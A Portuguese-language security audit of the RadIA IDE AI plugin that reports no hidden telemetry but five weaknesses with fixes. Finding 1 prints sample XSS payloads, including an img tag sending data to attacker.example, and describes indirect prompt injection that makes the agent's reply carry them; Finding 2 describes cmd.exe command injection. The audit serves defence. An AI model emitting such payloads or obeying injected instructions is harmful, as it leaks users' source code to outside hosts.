# Auditoria de segurança — RadIA v2.9.0

## Vazamento de dados a terceiros

**Data:** 12/08/2026
**Escopo:** análise estática do código-fonte em `d:\RadIA-Plugin` (383 arquivos `.pas`/`.dpr`/`.dpk`, além da UI web em `Source/UI/Web`)
**Commit auditado:** `e1a5fb1` — *docs: Record v2.9.0 publication evidence*
**Método:** somente leitura, com validação empírica isolada do pipeline de renderização Markdown

---

## Conclusão principal

**Não há vazamento malicioso ou oculto de dados.** Não foi encontrada telemetria, backdoor, canal de exfiltração encoberto ou coleta de identificadores do usuário.

Foram encontradas, porém, **fragilidades reais** que podem levar a exposição de dados — uma delas explorável remotamente. Cada achado foi verificado diretamente no código.

---

## O que está correto

| Controle | Evidência |
|---|---|
| **Endpoints legítimos** | Apenas provedores de IA escolhidos pelo usuário (OpenAI, Anthropic, Gemini, Bedrock, DeepSeek, Groq, Mistral, Qwen, OpenRouter, Copilot, e Ollama/LMStudio locais). URLs hardcoded, nenhum domínio suspeito. |
| **Zero telemetria** | Nenhum fingerprint de máquina (sem MAC, HWID, serial, username). Nenhum header não-padrão enviado aos provedores. |
| **API keys com DPAPI** | `CryptProtectData` no registro; mascaradas nos logs por `MaskHeaders`. **As chaves não vazam para o log.** |
| **TLS íntegro** | Nenhum override de validação de certificado em todo o código — elimina uma classe comum de MITM. |
| **Embeddings remotos opt-in** | Exigem `Enabled` **e** `ConsentGranted`, ambos `False` por padrão. |
| **Workspace boundary** | Bloqueia path traversal, raiz de volume e junctions/symlinks. |
| **Consentimento por risco** | Deny-by-default para ferramentas sensíveis, com auditoria redigida. |
| **Testes de segurança** | Existem testes automatizados dedicados: `ExternalMcpSecurity`, `KnowledgePrivacy`, `ToolSecurity`, `WorkspaceBoundary`. |

A [documentação de compliance](docs/compliance.md) descreve fielmente o comportamento observado no código.

---

## Achado 1 — XSS no chat permite exfiltração sem clique

**Severidade: ALTA** · Explorável remotamente

### Descrição

As linhas [chat.js:3084](Source/UI/Web/chat.js#L3084) e [chat.js:3364](Source/UI/Web/chat.js#L3364) renderizam a resposta da IA com:

```js
innerHTML = marked.parse(text)
```

Não há DOMPurify e **nenhum dos arquivos HTML possui Content-Security-Policy** (`chat.html` e `diff.html` verificados). O `marked` v15 removeu a opção `sanitize`, portanto a sanitização precisa ser externa — e não existe.

### Validação empírica

Executando o próprio `marked.min.js` do projeto, os payloads passam **intactos**:

```
<img src="https://attacker.example/p?d=LEAK">     → passa intacto
<iframe src="https://attacker.example/"></iframe> → passa intacto
[clique](javascript:alert(1))                     → href javascript: preservado
<script>fetch(...)</script>                       → passa intacto
```

### Impacto

A tag `<img>` dispara requisição de rede **automaticamente ao renderizar**, sem qualquer interação do usuário — é o vetor clássico de exfiltração, levando trechos do código na query string.

O gatilho é *prompt injection indireta*: basta o agente ler um arquivo, issue ou página contendo instruções maliciosas para que a resposta carregue o payload.

### Fatores atenuantes

Dois fatores reduzem a severidade de crítica para alta:

- O WebView **não expõe host objects** (`AddHostObject` ausente) — o XSS não alcança ferramentas nativas da IDE.
- **Nenhuma API key chega ao JavaScript** — o dano restringe-se ao conteúdo da conversa.

O handler `NavigationStarting` ([ChatFrame.pas:689-694](Source/UI/RadIA.UI.ChatFrame.pas#L689-L694)) já bloqueia navegação por allowlist, mas **não intercepta subrecursos** como `<img>` — daí a lacuna.

### Correção recomendada

Adicionar CSP restritiva em `chat.html`:

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; img-src 'self' data:; connect-src 'none'; frame-src 'none'">
```

É a mitigação de maior efeito e menor custo. Sanitizar com DOMPurify complementa.

---

## Achado 2 — Injeção de comando via `cmd.exe`

**Severidade: MÉDIA**

### Descrição

Em [ConfigFrame.pas:2522-2533](Source/UI/RadIA.UI.ConfigFrame.pas#L2522-L2533):

```pascal
LParameters := '/c ""' + LDetection.ExecutablePath + '" login"';
```

Concatenação direta entregue a `cmd.exe` via `ShellExecuteEx`, **sem validação de caracteres**. Um caminho de CLI contendo `&`, `|` ou `^` executa comando arbitrário, porque o `cmd` re-parseia a linha.

O vetor é limitado — exige que o usuário aponte ou persista esse caminho na configuração — mas é injeção real.

### Correção recomendada

Usar `lpFile := LDetection.ExecutablePath` com `lpParameters` separado, em vez de passar por `cmd.exe`. Alternativamente, validar o caminho contra `"`, `&`, `|`, `^`.

---

## Achado 3 — Código-fonte persistido em claro, sem retenção

**Severidade: MÉDIA**

### Descrição

Trechos do código do usuário e respostas do LLM ficam em **texto claro** sob `%APPDATA%\RadIA\`:

| Dado | Caminho | Evidência |
|---|---|---|
| Base de conhecimento | `Knowledge\*.knowledge.json` | [KnowledgeStore.pas:284](Source/Core/RadIA.Core.KnowledgeStore.pas#L284) — grava `content` bruto dos chunks |
| Histórico de conversas | `sessions\*.json` | `Sessions.pas:525` |
| Cache de respostas | `cache.json` | `Cache.pas:298` |
| Histórico de prompts | `prompt_history.json` | `PromptHistory.pas:160` |
| Checkpoints de agente | `agent-checkpoints\*.json` | `AgentRuntime.pas:899` |

**Nenhum destes caminhos usa DPAPI** — o `TCredentialProtector` só é aplicado no registro.

### Retenção inconsistente

- Existe apenas para *agent-results* (14 dias).
- **Sem retenção:** sessões, prompt history, knowledge, checkpoints.
- `audit\tools.jsonl` cresce indefinidamente (append infinito).
- Logs têm rotação, mas os arquivos rotacionados nunca são excluídos.

### Logging habilitado por padrão

`LogPayloadSummary` grava **preview de 320 caracteres do corpo da requisição e da resposta** ([Provider.Base.pas:149-155](Source/Providers/RadIA.Provider.Base.pas#L149-L155), chamado nas linhas 321, 328 e 351), com logging **ligado por padrão** ([Config.pas:251](Source/Core/RadIA.Core.Config.pas#L251)) e **sem redação** — diferente do pipeline de auditoria de ferramentas, que usa `TRadIASecretRedactor`.

### Avaliação

Não é vazamento a terceiros — os dados ficam em `%APPDATA%`, que por padrão não é legível por outros usuários não-administradores. Mas é exposição em disco não cifrado, relevante para LGPD/GDPR e para coleta corporativa de logs.

### Correção recomendada

Passar o preview pelo `TRadIASecretRedactor` já existente, ou reduzir o log apenas ao comprimento (como já é feito em `DoGetRequest`). Definir política de retenção para sessões, knowledge e auditoria.

---

## Achado 4 — Exportador de conversas sem redação

**Severidade: MÉDIA**

### Descrição

O [ConversationExporter.pas](Source/Core/RadIA.Core.ConversationExporter.pas) emite `LMsg.Content` integralmente, tanto no formato Markdown quanto HTML.

O `IRadIASecretRedactor` **existe no projeto** e é usado no pipeline de consentimento/auditoria, mas **não é sequer referenciado** nesta unit — confirmado por busca direta.

O único filtro aplicado é a exclusão de mensagens `mrSystem`, que remove o system prompt mas não segredos presentes em prompts do usuário ou respostas.

### Impacto

Como o arquivo exportado costuma ser compartilhado com terceiros, quaisquer segredos que apareçam na conversa (senhas, connection strings, tokens em trechos de código) saem junto.

### Correção recomendada

Injetar e aplicar `IRadIASecretRedactor` no `TConversationExporter` antes da serialização.

---

## Achado 5 — MCP externo: consentimento e isolamento de ambiente

**Severidade: MÉDIA**

Três pontos que se combinam:

1. **Bypass de consentimento para `readOnly`** — [ToolSecurity.pas:548](Source/Core/RadIA.Core.ToolSecurity.pas#L548): `if ADescriptor.Risk = trReadOnly then Exit(cdAllowOnce);` retorna sem consultar o provider de consentimento. Vale também para ferramentas federadas de terceiros (`mcp.*`), cujo risco é definido pelo grant configurado.

2. **`AllowUnboundedAccess` desliga a validação de caminho** — [ExternalMcpSecurity.pas:252](Source/Core/RadIA.Core.ExternalMcpSecurity.pas#L252). Além disso, **apenas** os argumentos declarados em `PathArguments` são inspecionados; um campo `content` contendo o texto de um arquivo não é validado.

3. **Importação habilita servidores por padrão** — [ExternalMcpImport.pas:131](Source/Core/RadIA.Core.ExternalMcpImport.pas#L131): `enabled` tem default **`True`**. Importar um `mcp.json` de terceiros já traz servidores ativos.

Adicionalmente, os processos filhos **herdam o ambiente completo do IDE** (`lpEnvironment = nil` em `CliProcess.pas:396` e `PseudoTerminal.pas:538`). O plugin não injeta chaves, mas também não isola o ambiente entregue a processos de terceiros.

### Correção recomendada

- Exigir ao menos consentimento de sessão para ferramentas federadas (`mcp.*`), independentemente do risco declarado.
- Não importar servidores com `enabled=True` por padrão.
- Construir bloco de ambiente explícito (allowlist) em vez de `nil`.

---

## Resumo executivo

O RadIA envia código-fonte a provedores de IA — comportamento **inerente ao produto**, documentado e controlado por consentimento e escolha explícita de provedor. **Não há canal escondido.**

A arquitetura de segurança é **acima da média para plugins de IDE**: DPAPI para credenciais, workspace boundary robusto, consentimento por risco, auditoria com redação e testes automatizados dedicados.

### Prioridade de correção

| # | Achado | Severidade | Esforço |
|---|---|---|---|
| 1 | XSS no chat (CSP ausente) | Alta | Baixo |
| 2 | Injeção de comando via `cmd.exe` | Média | Baixo |
| 4 | Exportador sem redação | Média | Baixo |
| 3 | Persistência em claro / logging | Média | Médio |
| 5 | MCP externo: consentimento e ambiente | Média | Médio |

O **Achado 1** deve ser tratado primeiro por ser o único explorável remotamente via prompt injection, e por ter a correção de menor custo.

---

## Nota metodológica

A auditoria foi **somente de leitura** — nenhum arquivo do projeto foi alterado. A única execução realizada foi um teste isolado do `marked.min.js` em diretório temporário, para validar empiricamente o comportamento de sanitização em vez de presumi-lo.
